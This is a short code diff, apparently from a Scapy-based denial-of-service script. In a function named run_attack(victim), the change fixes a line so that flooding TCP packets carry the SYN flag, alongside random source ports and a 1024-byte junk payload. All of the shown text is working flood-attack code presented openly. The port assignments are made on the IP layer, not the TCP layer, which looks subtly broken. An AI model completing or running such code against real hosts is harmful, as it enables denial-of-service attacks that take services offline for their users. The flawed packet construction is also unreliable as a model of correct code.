@@ -27,7 +27,7 @@ def run_attack(victim):
         packetTCP = TCP()
         packetIP.sport = RandShort()
         packetIP.dport = port
-        packetTCP.flags + 'S'
+        packetTCP.flags = 'S'
 
         raw = Raw(b"N"*1024)
         packet = packetIP/packetTCP/raw
